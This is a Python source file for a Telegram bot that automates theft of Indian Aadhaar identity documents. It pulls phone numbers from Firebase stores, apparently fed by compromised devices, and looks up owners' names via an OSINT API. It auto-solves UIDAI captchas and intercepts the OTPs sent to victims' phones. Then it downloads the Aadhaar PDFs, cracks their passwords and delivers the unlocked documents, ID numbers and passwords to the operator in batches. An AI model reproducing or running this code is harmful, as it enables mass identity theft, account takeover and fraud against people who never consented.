            f"〔 #{idx}/{total} • attempt {attempt}/{self._retry_max} 〕\n"
            f"⟳ <b>Starting auto pipeline...</b>"
        )

        name = await self._auto_fetch_name(phone)
        self.update_status(
            f"📱 <b>[{phone}]</b>\n"
            f"〔 #{idx}/{total} 〕\n"
            f"✓ Name: <b>{escape_html(name)}</b>\n"
            f"⟳ <i>Fetching EID OTP...</i>"
        )

        eid, real_name = await self._auto_phase1_eid(chat_id, phone, name, idx, total)

        self.update_status(
            f"📱 <b>[{phone}]</b>\n"
            f"〔 #{idx}/{total} 〕\n"
            f"✓ Name: <b>{escape_html(real_name or name)}</b>\n"
            f"✓ EID: <code>{eid}</code>\n"
            f"⟳ <i>Fetching PDF OTP...</i>"
        )

        await self._auto_phase2_pdf(chat_id, phone, real_name or name, eid, idx, total)

        self.update_status(
            f"📱 <b>[{phone}]</b>\n"
            f"〔 #{idx}/{total} ✅ 〕\n"
            f"✓ Name: <b>{escape_html(real_name or name)}</b>\n"
            f"✓ EID: <code>{eid}</code>\n"
            f"✅ <b>Aadhaar PDF delivered</b>"
        )
        return True

    async def _auto_fetch_name(self, phone):
        """Fetch name from sarkariupdate.online (with full debug logging)."""
        name = "MR"
        try:
            r = await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: _requests.get(
                    f"https://sarkariupdate.online/osint/APIX.php?api=num_api&q={phone}",
                    timeout=8
                )
            )
            raw = r.text[:200] if r.status_code == 200 else f"HTTP {r.status_code}"
            print(f"🔍 [NAME-API] phone={phone} status={r.status_code} raw={raw}", flush=True)
            if r.status_code == 200:
                fn = (r.json().get('name') or '').strip()
                if fn and fn.lower() not in ['unknown', 'n/a', '']:
                    name = fn.upper()
        except Exception as e:
            print(f"⚠️ [NAME-API] phone={phone} error={e}", flush=True)
        print(f"🔍 [NAME-API] final name for {phone}: '{name}'", flush=True)
        return name

    async def _auto_phase1_eid(self, chat_id, phone, name, idx, total):
        """Direct UIDAI call — no subprocess. Ported from aad.py."""
        print(f"[PHASE1 {phone}] starting, name='{name}'", flush=True)

        # --- Send EID OTP (up to 5 captcha attempts) ---
        sent = False
        etxn = None
        last_cap = None
        last_ctxn = None
        lerr = ""
        for attempt in range(1, 6):
            self.update_status(
                f"📱 <b>[{phone}]</b>\n"
                f"〔 #{idx}/{total} 〕\n"
                f"✓ Name: <b>{escape_html(name)}</b>\n"
                f"⟳ <i>Captcha {attempt}/5...</i>"
            )
            img, ctxn, tid = await asyncio.get_event_loop().run_in_executor(
                None, _uidai_get_captcha
            )
            if not img:
                lerr = "Captcha unavailable"
                await asyncio.sleep(1)
                continue

            code = await asyncio.get_event_loop().run_in_executor(
                None, _uidai_solve_cap, img
            )
            code = re.sub(r'[^a-zA-Z0-9]', '', code or '')
            print(f"[PHASE1 {phone}] captcha attempt {attempt}: '{code}'", flush=True)

            if not code or len(code) < 4:
                lerr = "Captcha unsolved"
                continue

            ok, txn, err = await asyncio.get_event_loop().run_in_executor(
                None, _uidai_send_eid_otp, phone, name, code, ctxn, tid
            )
            if ok:
                sent = True
                etxn = txn
                last_cap = code
                last_ctxn = ctxn
                print(f"[PHASE1 {phone}] ✓ OTP sent, txnId={txn}", flush=True)
                break
            else:
                lerr = err or "Unknown"
                print(f"[PHASE1 {phone}] send failed: {lerr}", flush=True)
                if "captcha" not in str(err).lower() and "invalid" not in str(err).lower():
                    raise Exception(lerr)
                await asyncio.sleep(1)

        if not sent:
            raise Exception(f"EID OTP send failed: {lerr}")

        # --- Wait for EID OTP on Firebase ---
        self.update_status(
            f"📱 <b>[{phone}]</b>\n"
            f"〔 #{idx}/{total} 〕\n"
            f"✓ EID OTP requested\n"
            f"⏳ <i>Reading OTP ({EID_OTP_TIMEOUT}s)...</i>"
        )

        known = await self._get_firebase_keys_snapshot()
        otp, key = await firebase_wait_for_otp(
            self._bound_url, self._bound_cid, known,
            timeout=EID_OTP_TIMEOUT, interval=3,
            exclude_keywords=["download", "e/aadhaar", "e-aadhaar", "eaadhaar"],
        )
        if not otp:
            raise Exception(f"No EID OTP received within {EID_OTP_TIMEOUT}s")
        auto_otp_state["used_otps"].add((self._bound_url, key))
        print(f"[PHASE1 {phone}] ✓ OTP={otp}", flush=True)

        # --- Verify EID ---
        self.update_status(
            f"📱 <b>[{phone}]</b>\n"
            f"〔 #{idx}/{total} 〕\n"
            f"✓ OTP: <code>{otp}</code>\n"
            f"⟳ <i>Verifying EID...</i>"
        )

        ok2, eid, vn = await asyncio.get_event_loop().run_in_executor(
            None, _uidai_verify_eid, phone, name, otp, etxn, last_ctxn, last_cap
        )
        if not ok2:
            raise Exception(f"EID verify failed: {vn}")

        real_name = vn if vn and vn.strip() else name
        print(f"[PHASE1 {phone}] ✅ EID={eid} name={real_name}", flush=True)
        return eid, real_name

    async def _auto_phase2_pdf(self, chat_id, phone, name, eid, idx, total):
        """Direct UIDAI call for PDF download. Ported from aad.py."""
        print(f"[PHASE2 {phone}] starting EID={eid}", flush=True)

        # --- Send PDF OTP ---
        psent = False
        ptxn = None
        t2 = None
        last_cap2 = None
        last_ctxn2 = None
        for attempt in range(1, 6):
            self.update_status(
                f"📱 <b>[{phone}]</b>\n"
                f"〔 #{idx}/{total} 〕\n"
                f"✓ EID: <code>{eid}</code>\n"
                f"⟳ <i>PDF Captcha {attempt}/5...</i>"
            )
            img2, ctxn2, tid2 = await asyncio.get_event_loop().run_in_executor(
                None, _uidai_get_captcha
            )
            if not img2:
                await asyncio.sleep(1)
                continue
            code2 = await asyncio.get_event_loop().run_in_executor(
                None, _uidai_solve_cap, img2
            )
            code2 = re.sub(r'[^a-zA-Z0-9]', '', code2 or '')
            print(f"[PHASE2 {phone}] captcha attempt {attempt}: '{code2}'", flush=True)
            if not code2 or len(code2) < 4:
                continue
            ok, txn, err = await asyncio.get_event_loop().run_in_executor(
                None, _uidai_send_aadh_otp, eid, code2, ctxn2, tid2
            )
            if ok:
                psent = True
                ptxn = txn
                t2 = tid2
                last_cap2 = code2
                last_ctxn2 = ctxn2
                print(f"[PHASE2 {phone}] ✓ OTP sent, txnId={txn}", flush=True)
                break
            else:
                print(f"[PHASE2 {phone}] send failed: {err}", flush=True)
                if "captcha" not in str(err).lower():
                    raise Exception(err)
                await asyncio.sleep(1)

        if not psent:
            raise Exception("PDF OTP send failed")

        # --- Wait for PDF OTP on Firebase ---
        self.update_status(
            f"📱 <b>[{phone}]</b>\n"
            f"〔 #{idx}/{total} 〕\n"
            f"✓ EID: <code>{eid}</code>\n"
            f"✓ PDF OTP requested\n"
            f"⏳ <i>Reading PDF OTP ({PDF_OTP_TIMEOUT}s)...</i>"
        )

        known2 = await self._get_firebase_keys_snapshot()
        potp, key2 = await firebase_wait_for_otp(
            self._bound_url, self._bound_cid, known2,
            timeout=PDF_OTP_TIMEOUT, interval=3,
            require_keywords=["download", "e/aadhaar", "e-aadhaar", "eaadhaar"],
        )
        if not potp:
            print(f"[PHASE2 {phone}] filtered miss, trying unfiltered", flush=True)
            potp, key2 = await firebase_wait_for_otp(
                self._bound_url, self._bound_cid, known2,
                timeout=30, interval=3,
            )
        if not potp:
            raise Exception(f"No PDF OTP received within {PDF_OTP_TIMEOUT}s")
        auto_otp_state["used_otps"].add((self._bound_url, key2))
        print(f"[PHASE2 {phone}] ✓ PDF OTP={potp}", flush=True)

        # --- Download PDF ---
        self.update_status(
            f"📱 <b>[{phone}]</b>\n"
            f"〔 #{idx}/{total} 〕\n"
            f"✓ PDF OTP: <code>{potp}</code>\n"
            f"⟳ <i>Downloading PDF...</i>"
        )

        ok, pdf_path = await asyncio.get_event_loop().run_in_executor(
            None, _uidai_dl_pdf, eid, potp, ptxn, t2
        )
        if not ok:
            raise Exception(f"PDF download failed: {pdf_path}")

        print(f"[PHASE2 {phone}] ✅ PDF saved: {pdf_path}", flush=True)

        # --- Crack + send ---
        await self.process_cracked_pdf(chat_id, pdf_path, name, phone, eid=eid, user_info=None)

    # ==========================================================================
    # LEGACY /start flow — still uses subprocesses for manual captcha
    # ==========================================================================
    async def run_flow(self, chat_id, name, mobile, dob, user_info=None):
        self.start_time = time.time()
        self.start_preloader(f"📱 <b>STEP 3/4: EID Retrieval</b>\n\n⏳ <b>Retrieving EID details...</b>\n📱 <b>Target Mobile:</b> <code>{mobile}</code>")

        script_dir = os.path.dirname(os.path.abspath(__file__))
        get_eid_script = os.path.join(script_dir, 'retrive-eid.py')
        formatted_dob_iso = dob

        found_id = None
        process = None
        captured_real_name = name
        try:
            process = await asyncio.create_subprocess_exec(
                sys.executable, '-u', get_eid_script, name, str(formatted_dob_iso), mobile,
                self._unique_suffix,
                stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            while True:
                line_bytes = await process.stdout.readline()
                if not line_bytes:
                    break
                line = line_bytes.decode('utf-8', errors='ignore').strip()
                print(f"[get_eid] {line}")

                if "🔑 MANUAL CAPTCHA REQUIRED |" in line:
                    b64_img = line.split("🔑 MANUAL CAPTCHA REQUIRED |")[1].strip()
                    self.stop_preloader()
                    temp_captcha_path = os.path.join(script_dir, f"temp_captcha_p1_{chat_id}{self._unique_suffix}.png")
                    with open(temp_captcha_path, "wb") as f_cap:
                        f_cap.write(base64.b64decode(b64_img.encode()))
                    with open(temp_captcha_path, "rb") as f_photo:
                        photo_msg = self.bot.send_photo(
                            chat_id, f_photo,
                            caption="⚠️ <b>Auto-Captcha solve failed!</b>\n👇 Kripya captcha manually type karein:",
                            parse_mode='HTML'
                        )
                        try:
                            if photo_msg and int(chat_id) < 0:
                                self.temp_msg_ids.append(photo_msg.message_id)
                        except: pass
                    user_captcha_val = await self.wait_for_input(chat_id, 'CAPTCHA')
                    self.start_preloader(f"📱 <b>STEP 3/4: EID Retrieval</b>\n\n⏳ <b>Submitting Captcha...</b>")
                    try: os.remove(temp_captcha_path)
                    except: pass
                    process.stdin.write(f"{user_captcha_val}\n".encode())
                    await process.stdin.drain()

                if "ENTER THE OTP RECEIVED ON YOUR REGISTERED MOBILE" in line:
                    res_otp = await self.wait_for_input(chat_id, 'OTP')
                    self.refresh_status_card(f"📱 <b>STEP 3/4: OTP 1 Verification</b>\n\n⏳ <b>Submitting OTP 1...</b>")
                    self.start_preloader(f"📱 <b>STEP 3/4: OTP 1 Verification</b>\n\n⏳ <b>Submitting OTP 1...</b>")
                    process.stdin.write(f"{res_otp}\n".encode())
                    await process.stdin.drain()

                if "CAPTURED ID SUCCESSFULLY:" in line:
                    found_id = line.split("CAPTURED ID SUCCESSFULLY:")[1].strip()
                    found_id = re.sub(r'[^a-zA-Z0-9]', '', found_id)

                if "CAPTURED NAME SUCCESSFULLY:" in line:
                    captured_real_name = line.split("CAPTURED NAME SUCCESSFULLY:")[1].strip()

            await process.wait()
            if not found_id:
                stderr_bytes = await process.stderr.read()
                stderr_str = stderr_bytes.decode('utf-8', errors='ignore').strip()
                if stderr_str:
                    if "An error occurred:" in stderr_str:
                        raw = stderr_str.split("An error occurred:")[1].strip()
                        real = _extract_real_error(raw) or raw.splitlines()[0]
                        raise Exception(real)
                    real = _extract_real_error(stderr_str)
                    if real:
                        raise Exception(real)
                raise Exception("Aadhaar details galat hain ya portal response match nahi ho raha.")
        except Exception as e:
            self.stop_preloader()
            if process:
                try: process.kill()
                except: pass
            raise e

        if found_id:
            self.stop_preloader()
            await self.run_uidai_phase(chat_id, found_id, captured_real_name, mobile, user_info=user_info)

    async def run_uidai_phase(self, chat_id, eid, name, mobile, user_info=None):
        self.start_preloader(f"📱 <b>STEP 4/4: Aadhaar Download</b>\n\n⏳ <b>Fetching Aadhaar PDF...</b>")

        script_dir = os.path.dirname(os.path.abspath(__file__))
        download_script = os.path.join(script_dir, 'aadhar-downlaod.py')
        unique_suffix = getattr(self, "_unique_suffix", "")

        max_retries = 3
        current_retry = 0
        while current_retry < max_retries:
            process = None
            try:
                process = await asyncio.create_subprocess_exec(
                    sys.executable, '-u', download_script, str(eid), str(chat_id), unique_suffix,
                    stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                while True:
                    line_bytes = await process.stdout.readline()
                    if not line_bytes:
                        break
                    line = line_bytes.decode('utf-8', errors='ignore').strip()
                    print(f"[aadhar-downlaod] {line}")

                    if line.startswith("🔑 MANUAL CAPTCHA REQUIRED |"):
                        b64_img = line.split("🔑 MANUAL CAPTCHA REQUIRED |")[1].strip()
                        self.stop_preloader()
                        temp_captcha_path = os.path.join(script_dir, f"temp_captcha_p2_{chat_id}{self._unique_suffix}.png")
                        with open(temp_captcha_path, "wb") as f_cap:
                            f_cap.write(base64.b64decode(b64_img.encode()))
                        with open(temp_captcha_path, "rb") as f_photo:
                            photo_msg = self.bot.send_photo(
                                chat_id, f_photo,
                                caption="⚠️ <b>Auto-Captcha solve failed!</b>\n👇 Kripya captcha manually type karein:",
                                parse_mode='HTML'
                            )
                            try:
                                if photo_msg and int(chat_id) < 0:
                                    self.temp_msg_ids.append(photo_msg.message_id)
                            except: pass
                        user_captcha_val = await self.wait_for_input(chat_id, 'CAPTCHA')
                        self.start_preloader(f"📱 <b>STEP 4/4: Aadhaar Download</b>\n\n⏳ <b>Submitting Captcha...</b>")
                        try: os.remove(temp_captcha_path)
                        except: pass
                        process.stdin.write(f"{user_captcha_val}\n".encode())
                        await process.stdin.drain()

                    if "ENTER THE OTP RECEIVED ON YOUR REGISTERED MOBILE" in line:
                        res_otp = await self.wait_for_input(chat_id, 'OTP')
                        self.refresh_status_card(f"📱 <b>STEP 4/4: OTP 2 Verification</b>\n\n⏳ <b>Submitting OTP 2...</b>")
                        self.start_preloader(f"📱 <b>STEP 4/4: OTP 2 Verification</b>\n\n⏳ <b>Submitting OTP 2...</b>")
                        process.stdin.write(f"{res_otp}\n".encode())
                        await process.stdin.drain()

                await process.wait()
                file_path = os.path.join(CRACKED_DIR, f"Aadhaar_{chat_id}{unique_suffix}.pdf")
                if os.path.exists(file_path):
                    await self.process_cracked_pdf(chat_id, file_path, name, mobile, eid=eid, user_info=user_info)
                    return
                else:
                    stderr_bytes = await process.stderr.read()
                    stderr_str = stderr_bytes.decode('utf-8', errors='ignore').strip()
                    if stderr_str:
                        if "An error occurred:" in stderr_str:
                            raw = stderr_str.split("An error occurred:")[1].strip()
                            real = _extract_real_error(raw) or raw.splitlines()[0]
                            raise Exception(real)
                        real = _extract_real_error(stderr_str)
                        if real:
                            raise Exception(real)
                    raise Exception("Aadhaar download failed")
            except Exception as e:
                self.stop_preloader()
                if process:
                    try: process.kill()
                    except: pass
                current_retry += 1
                if current_retry < max_retries:
                    self.update_status(f"⚠️ <b>Retry {current_retry}/{max_retries}:</b> {escape_html(str(e))}")
                    await asyncio.sleep(2)
                else:
                    raise Exception(f"Registry Phase Failed: {e}")

    async def process_cracked_pdf(self, chat_id, file_path, name, mobile, eid=None, user_info=None):
        self.start_preloader("🔓 <b>File Downloaded!</b> Unlocking PDF...")
        try:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            proc_script = os.path.join(script_dir, 'pdf_processor.py')
            os.makedirs(CRACKED_DIR, exist_ok=True)
            unique_suffix = getattr(self, "_unique_suffix", "")
            req_id = f"{chat_id}{unique_suffix}"

            process = await asyncio.create_subprocess_exec(
                sys.executable, proc_script, file_path, name, CRACKED_DIR, str(req_id), 'True',
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()
            stdout_str = stdout.decode('utf-8', errors='ignore')
            stderr_str = stderr.decode('utf-8', errors='ignore').strip()

            success_line = None
            uncracked_line = None
            error_line = None
            for line in stdout_str.split('\n'):
                line = line.strip()
                if line.startswith('SUCCESS|'):
                    success_line = line; break
                if line.startswith('UNCRACKED|'):
                    uncracked_line = line; break
                if line.startswith('ERROR|'):
                    error_line = line[6:]

            if success_line:
                self.stop_preloader()
                parts = success_line.split('|', 5)
                if len(parts) < 6:
                    raise Exception("PDF processor returned malformed line")
                _, uid, pdf_out, front, back, password = parts

                elapsed_str = "N/A"
                if hasattr(self, 'start_time') and self.start_time:
                    s = int(time.time() - self.start_time)
                    elapsed_str = f"{s//60}m {s%60}s" if s >= 60 else f"{s}s"

                self.bot.send_message(chat_id,
                    f"🎉 <b>Success! Aadhaar Cracked.</b>\n\n"
                    f"👤 <b>Name:</b> <code>{name}</code>\n"
                    f"🆔 <b>EID:</b> <code>{eid or 'N/A'}</code>\n"
                    f"🔢 <b>Aadhaar:</b> <code>{uid}</code>\n"
                    f"🔑 <b>Password:</b> <code>{password}</code>\n\n"
                    f"⏱️ <b>Time:</b> {elapsed_str}",
                    parse_mode='HTML'
                )

                try:
                    stats_manager.record_success(chat_id, user_info, name, mobile, uid, password, eid=eid)
                except: pass

                try:
                    import shutil
                    safe_name = "".join(c for c in name if c.isalnum() or c in (' ', '_', '-')).strip().replace(' ', '_')
                    safe_uid = uid.replace(' ', '')
                    shutil.copy(pdf_out, os.path.join(CRACKED_DIR, f"{safe_name}_{safe_uid}.pdf"))
                except: pass

                self.update_status("📤 <b>Sending Aadhaar files...</b>")
                try:
                    if os.path.exists(front):
                        with open(front, 'rb') as f:
                            self.bot.send_photo(chat_id, f, caption="🖼️ <b>Aadhaar Front</b>", parse_mode='HTML')
                except: pass
                try:
                    if os.path.exists(back):
                        with open(back, 'rb') as f:
                            self.bot.send_photo(chat_id, f, caption="🖼️ <b>Aadhaar Back</b>", parse_mode='HTML')
                except: pass
                try:
                    if os.path.exists(pdf_out):
                        with open(pdf_out, 'rb') as f:
                            self.bot.send_document(chat_id, f, caption="📄 <b>Aadhaar PDF (Unlocked)</b>")
                except: pass

                self.update_status(f"✅ <b>Process Completed!</b>")
                for temp_f in [front, back, pdf_out, file_path]:
                    if temp_f and os.path.exists(temp_f):
                        try: os.remove(temp_f)
                        except: pass
                return

            if uncracked_line:
                self.stop_preloader()
                parts = uncracked_line.split('|', 1)
                locked_pdf_path = parts[1] if len(parts) > 1 else file_path
                self.bot.send_message(chat_id,
                    f"⚠️ <b>Aadhaar Crack Failed!</b>\n"
                    f"👤 {name}\n🆔 {eid or 'N/A'}\n"
                    f"Sending locked PDF...",
                    parse_mode='HTML'
                )
                try: stats_manager.record_failure()
                except: pass
                try:
                    if os.path.exists(locked_pdf_path):
                        with open(locked_pdf_path, 'rb') as f:
                            self.bot.send_document(chat_id, f, caption="📄 <b>Aadhaar PDF (Locked)</b>")
                except: pass
                self.update_status("✅ <b>Done (locked PDF)</b>")
                if os.path.exists(file_path):
                    try: os.remove(file_path)
                    except: pass
                return

            if error_line:
                raise Exception(f"PDF Error: {error_line}")
            elif stderr_str:
                real = _extract_real_error(stderr_str)
                raise Exception(f"PDF crash: {real or stderr_str.splitlines()[-1]}")
            else:
                raise Exception("PDF crack failed — password not found")
        except Exception as e:
            self.stop_preloader()
            self.update_status(f"❌ <b>PDF Error:</b> {escape_html(str(e))}")


# ==============================================================================
# 🚀 AUTO BATCH RUNNER — STRICTLY SEQUENTIAL
# ==============================================================================
async def run_auto_batch(bot, chat_id, max_phones=None):
    links = _load_firebase_links()
    if not links:
        bot.send_message(chat_id, "📭 No Firebase links. Use /addfire URL first.", parse_mode='HTML')
        return

    batch_id = str(uuid.uuid4())[:8]

    announce_msg = bot.send_message(
        chat_id,
        f"🚀 <b>AUTO PIPELINE STARTED</b> ({batch_id})\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔍 <i>Scanning Firebase...</i>",
        parse_mode='HTML'
    )
    announce_mid = announce_msg.message_id if announce_msg else None

    all_targets = []
    seen_phones = set()
    async with aiohttp.ClientSession() as session:
        for entry in links:
            url = entry.get("url")
            if not url:
                continue
            try:
                mapping = await firebase_find_phone_map(session, url, limit_devices=None)
                for phone, cid in mapping.items():
                    if phone in seen_phones:
                        continue
                    seen_phones.add(phone)
                    all_targets.append({"phone": phone, "url": url, "cid": cid})
            except Exception as e:
                print(f"⚠️ [AUTO-SCAN] {url}: {e}")
                continue

    if not all_targets:
        if announce_mid:
            try:
                bot.edit_message_text(chat_id=chat_id, message_id=announce_mid,
                                       text="⚠️ No online devices found.", parse_mode='HTML')
            except: pass
        return

    targets = all_targets if max_phones is None else all_targets[:max_phones]
    total = len(targets)

    if announce_mid:
        try:
            bot.edit_message_text(
                chat_id=chat_id, message_id=announce_mid,
                text=(
                    f"🚀 <b>AUTO PIPELINE STARTED</b> ({batch_id})\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 <b>Detected:</b> {len(all_targets)} online phone(s)\n"
                    f"🎯 <b>Processing:</b> {total}\n"
                    f"⚙️ <b>Mode:</b> DIRECT UIDAI (no subprocess)\n"
                    f"🔄 <b>Retry:</b> up to 2 attempts per phone\n"
                    f"⏱️ <b>OTP timeout:</b> {EID_OTP_TIMEOUT}s each\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"⏳ Starting phone #1..."
                ),
                parse_mode='HTML'
            )
        except: pass

    results = {"success": 0, "failed": 0}

    for i, t in enumerate(targets):
        idx = i + 1
        phone = t["phone"]
        url = t["url"]
        cid = t["cid"]

        print(f"\n▶️ [AUTO SEQ] ============ Starting #{idx}/{total}: {phone} ============", flush=True)

        engine = AadhaarEngine(bot, chat_id=chat_id)
        engine._unique_suffix = f"_a{idx}"

        orig_update = engine.update_status

        def prefixed(text, _p=phone, _o=orig_update):
            try:
                _o(f"📱 <b>[{_p}]</b>\n{text}")
            except: pass

        engine.update_status = prefixed

        try:
            success = await asyncio.wait_for(
                engine.run_auto_pipeline(chat_id, phone, url, cid, idx, total),
                timeout=300
            )
            if success:
                results["success"] += 1
                print(f"✅ [AUTO SEQ] #{idx}/{total} {phone} SUCCESS", flush=True)
            else:
                results["failed"] += 1
                print(f"❌ [AUTO SEQ] #{idx}/{total} {phone} FAILED", flush=True)
        except asyncio.TimeoutError:
            print(f"⏰ [AUTO SEQ] #{idx}/{total} {phone} TIMED OUT (5 min)", flush=True)
            results["failed"] += 1
        except Exception as e:
            print(f"❌ [AUTO SEQ] #{idx}/{total} {phone} crashed: {e}", flush=True)
            results["failed"] += 1
        finally:
            try:
                await engine.delete_temp_messages()
            except: pass
            try:
                await engine.close()
            except: pass

        if idx < total:
            print(f"⏸️ [AUTO SEQ] Pausing {INTER_PHONE_DELAY}s before next phone...", flush=True)
            await asyncio.sleep(INTER_PHONE_DELAY)

    summary = (
        f"🏁 <b>AUTO PIPELINE COMPLETE</b> ({batch_id})\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>Success:</b> {results['success']}\n"
        f"❌ <b>Failed:</b> {results['failed']}\n"
        f"📊 <b>Total:</b> {total} / {len(all_targets)} online\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )
    try:
        bot.send_message(chat_id, summary, parse_mode='HTML')
    except: pass

    print(f"🏁 [AUTO SEQ] Batch {batch_id} complete: {results['success']} ok / {results['failed']} failed", flush=True)


def start_auto_batch(bot, chat_id, max_phones=None):
    global _running_loop
    if not _running_loop or not _running_loop.is_running():
        print("⚠️ [AUTO-BATCH] Event loop not ready.")
        return False

    async def _runner():
        try:
            await run_auto_batch(bot, chat_id, max_phones)
        except Exception as e:
            print(f"❌ [AUTO-BATCH] {e}")
            try:
                bot.send_message(chat_id, f"❌ Auto pipeline crashed: {e}", parse_mode='HTML')
            except: pass

    try:
        asyncio.run_coroutine_threadsafe(_runner(), _running_loop)
        return True
    except Exception as e:
        print(f"⚠️ [AUTO-BATCH] {e}")
        return False


# ==============================================================================
# LEGACY helpers for /start manual flow
# ==============================================================================
async def execute_task(bot, chat_id, name, mobile, dob, user_info=None):
    str_chat_id = str(chat_id)
    if str_chat_id in active_tasks:
        bot.send_message(chat_id, "⏳ Task already running.", parse_mode='HTML')
        return False
    max_concurrent = stats_manager.get_max_concurrent_tasks()
    if len(active_tasks) >= max_concurrent:
        bot.send_message(chat_id, f"⚠️ Bot overloaded ({max_concurrent} active).", parse_mode='HTML')
        return False
    active_tasks.add(str_chat_id)
    if str_chat_id in active_engines:
        engine = active_engines[str_chat_id]
    else:
        engine = AadhaarEngine(bot, chat_id=str_chat_id)
        active_engines[str_chat_id] = engine
    try:
        await engine.run_flow(chat_id, name, mobile, dob, user_info=user_info)
    except Exception as e:
        err = str(e)
        engine.update_status(f"❌ <b>Task Failed:</b> {escape_html(err)}")
        try: stats_manager.log_error(chat_id, user_info, f"Task Failed: {err}")
        except: pass
    finally:
        active_engines.pop(str_chat_id, None)
        active_tasks.discard(str_chat_id)
        try: await engine.delete_temp_messages()
        except: pass
        await engine.close()
    return True


def prewarm_engine(bot, chat_id, mobile=None):
    str_chat_id = str(chat_id)
    if str_chat_id in active_engines:
        engine = active_engines[str_chat_id]
        if mobile and (not hasattr(engine, 'phase1_process') or engine.phase1_process is None):
            engine.start_early_phase1(mobile)
        return
    engine = AadhaarEngine(bot, chat_id=str_chat_id)
    active_engines[str_chat_id] = engine
    global _running_loop
    if _running_loop and _running_loop.is_running() and mobile:
        engine.start_early_phase1(mobile)


async def scan_all_firebase_phones(limit_per_link=None, max_targets=5):
    links = _load_firebase_links()
    if not links:
        return []
    found = []
    seen_phones = set()
    async with aiohttp.ClientSession() as session:
        for entry in links:
            url = entry.get("url")
            if not url:
                continue
            try:
                mapping = await firebase_find_phone_map(session, url, limit_devices=limit_per_link)
                for phone, cid in mapping.items():
                    if phone in seen_phones:
                        continue
                    seen_phones.add(phone)
                    found.append({"phone": phone, "url": url, "cid": cid})
                    if max_targets and len(found) >= max_targets:
                        return found
            except Exception as e:
                print(f"⚠️ [SCAN] {url}: {e}")
                continue
    return found
